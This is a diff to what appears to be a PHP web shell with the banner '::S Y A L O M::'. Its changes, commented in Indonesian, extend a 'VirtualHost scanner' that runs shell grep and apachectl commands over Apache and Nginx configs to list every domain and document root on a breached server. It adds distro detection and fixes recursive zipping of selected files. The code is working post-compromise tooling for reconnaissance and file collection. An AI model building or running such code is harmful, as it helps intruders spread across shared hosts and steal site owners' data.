@@ -628,10 +628,13 @@ if (isset($_POST['action']) && $_POST['action'] === 'zip_selected' && !empty($_P
                 $zip->addFile($filePath, basename($filePath));
             } elseif (is_dir($filePath)) {
                 $zip->addEmptyDir(basename($filePath));
+                $baseDir = basename($filePath);
                 $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath), RecursiveIteratorIterator::SELF_FIRST);
                 foreach ($iterator as $fileInfo) {
                     if ($fileInfo->isDot()) continue;
-                    $localPath = basename($filePath) . '/' . $iterator->getSubPathName();
+                    // Get relative path from inner iterator
+                    $subPath = $iterator->getInnerIterator()->getSubPathname();
+                    $localPath = $baseDir . '/' . $subPath;
                     if ($fileInfo->isDir()) {
                         $zip->addEmptyDir($localPath);
                     } else {
@@ -1197,6 +1200,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
 }
 
 // 🔥 VIRTUALHOST SCANNER - Find domains and document roots
+// Dokumentasi: Mencari di Apache/Nginx config files sesuai distro
 if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
     error_reporting(0);
     ini_set('display_errors', 0);
@@ -1211,21 +1215,49 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
     }
     
     $type = $_GET['server_type'] ?? 'all';
-    $results = ['success' => true, 'apache' => [], 'nginx' => [], 'litespeed' => [], 'other' => [], 'warnings' => []];
+    $results = ['success' => true, 'apache' => [], 'nginx' => [], 'litespeed' => [], 'other' => [], 'warnings' => [], 'distro' => ''];
+    
+    // Detect distro type
+    $distro = 'unknown';
+    if (is_dir('/etc/apache2/sites-available')) {
+        $distro = 'debian'; // Debian/Ubuntu
+    } elseif (is_dir('/etc/httpd/conf.d')) {
+        $distro = 'rhel'; // CentOS/RHEL
+    }
+    $results['distro'] = $distro;
     
     // Apache VirtualHost scanning
     if ($type === 'apache' || $type === 'all') {
-        $apache_paths = [
-            '/etc/apache2/sites-available',
-            '/etc/apache2/sites-enabled',
-            '/etc/httpd/conf.d',
-            '/etc/httpd/sites-available',
-            '/usr/local/apache2/conf',
-            '/opt/lampp/etc/extra',
-        ];
+        // Paths berdasarkan dokumentasi
+        $apache_paths = [];
+        
+        if ($distro === 'debian') {
+            // Debian/Ubuntu paths
+            $apache_paths = [
+                '/etc/apache2/sites-available',
+                '/etc/apache2/sites-enabled',
+            ];
+        } elseif ($distro === 'rhel') {
+            // CentOS/RHEL paths
+            $apache_paths = [
+                '/etc/httpd/conf.d',
+                '/etc/httpd/sites-available',
+            ];
+        } else {
+            // Try all known paths
+            $apache_paths = [
+                '/etc/apache2/sites-available',
+                '/etc/apache2/sites-enabled',
+                '/etc/httpd/conf.d',
+                '/etc/httpd/sites-available',
+                '/usr/local/apache2/conf',
+                '/opt/lampp/etc/extra',
+            ];
+        }
         
         foreach ($apache_paths as $path) {
             if (is_dir($path)) {
+                // Pattern sesuai dokumentasi: ServerName + DocumentRoot
                 $cmd = "grep -r -h -E 'ServerName|DocumentRoot|ServerAlias' " . escapeshellarg($path) . " 2>/dev/null | head -100";
                 $output = execute_shell_command($cmd);
                 if ($output) {
@@ -1234,7 +1266,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
             }
         }
         
-        // Try apachectl/S/httpd -S for configured vhosts
+        // Try apachectl -S for configured vhosts
         $apachectl_cmd = "apachectl -S 2>/dev/null || apache2ctl -S 2>/dev/null || httpd -S 2>/dev/null";
         $apachectl_output = execute_shell_command($apachectl_cmd);
         if ($apachectl_output) {
@@ -1243,17 +1275,37 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
     }
     
     // Nginx VirtualHost scanning
+    // Sesuai dokumentasi: Debian/Ubuntu vs CentOS/RHEL
     if ($type === 'nginx' || $type === 'all') {
-        $nginx_paths = [
-            '/etc/nginx/sites-available',
-            '/etc/nginx/sites-enabled',
-            '/etc/nginx/conf.d',
-            '/usr/local/nginx/conf',
-            '/opt/nginx/conf',
-        ];
+        $nginx_paths = [];
+        
+        if ($distro === 'debian') {
+            // Debian/Ubuntu paths
+            $nginx_paths = [
+                '/etc/nginx/sites-available',
+                '/etc/nginx/sites-enabled',
+            ];
+        } elseif ($distro === 'rhel') {
+            // CentOS/RHEL paths
+            $nginx_paths = [
+                '/etc/nginx/conf.d',
+            ];
+        } else {
+            // Try all known paths
+            $nginx_paths = [
+                '/etc/nginx/sites-available',
+                '/etc/nginx/sites-enabled',
+                '/etc/nginx/conf.d',
+                '/usr/local/nginx/conf',
+                '/opt/nginx/conf',
+            ];
+        }
         
         foreach ($nginx_paths as $path) {
             if (is_dir($path)) {
+                // Pattern sesuai dokumentasi: server_name + root
+                // Contoh dari dokumentasi:
+                // grep -R "server_name\|root" /etc/nginx/sites-available/ /etc/nginx/conf.d/
                 $cmd = "grep -r -h -E 'server_name|root|listen' " . escapeshellarg($path) . " 2>/dev/null | head -100";
                 $output = execute_shell_command($cmd);
                 if ($output) {
@@ -3104,7 +3156,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 1651</h1>
+        <h1>::S Y A L O M:: ~ 280326 1704</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4874,7 +4926,7 @@ try {
             }
             
             // Render results
-            renderVirtualHostResults(allVhosts, content);
+            renderVirtualHostResults(allVhosts, content, data);
             
         } catch (error) {
             let errorHtml = '<div style="color: #f44; padding: 20px; text-align: center; background: #1a0000; border: 1px solid #f44; border-radius: 4px;">';
@@ -4904,7 +4956,7 @@ try {
     // Function already defined
 }
 
-function renderVirtualHostResults(vhosts, content) {
+function renderVirtualHostResults(vhosts, content, scanData) {
     // Sort by server type then domain
     vhosts.sort((a, b) => {
         if (a.server !== b.server) return a.server.localeCompare(b.server);
@@ -4915,8 +4967,13 @@ function renderVirtualHostResults(vhosts, content) {
     const nginxCount = vhosts.filter(v => v.server === 'Nginx').length;
     const litespeedCount = vhosts.filter(v => v.server === 'LiteSpeed').length;
     
+    // Get distro info from scan data
+    const distroText = scanData && scanData.distro === 'debian' ? '📦 Debian/Ubuntu' : 
+                      scanData && scanData.distro === 'rhel' ? '🔴 CentOS/RHEL' : '❓ Unknown';
+    
     let html = `<div style="background: linear-gradient(135deg, #0f0, #0a0); color: #000; padding: 15px; border-radius: 4px; margin-bottom: 15px; text-align: center;">`;
     html += `<strong style="font-size: 16px;">🌐 ${vhosts.length} VirtualHost Ditemukan!</strong>`;
+    html += `<div style="font-size: 11px; margin-top: 5px; color: #333;">Distro: ${distroText}</div>`;
     html += `<div style="font-size: 12px; margin-top: 8px;">`;
     if (apacheCount > 0) html += `<span style="margin-right: 15px;">🔴 Apache: ${apacheCount}</span>`;
     if (nginxCount > 0) html += `<span style="margin-right: 15px;">🟢 Nginx: ${nginxCount}</span>`;
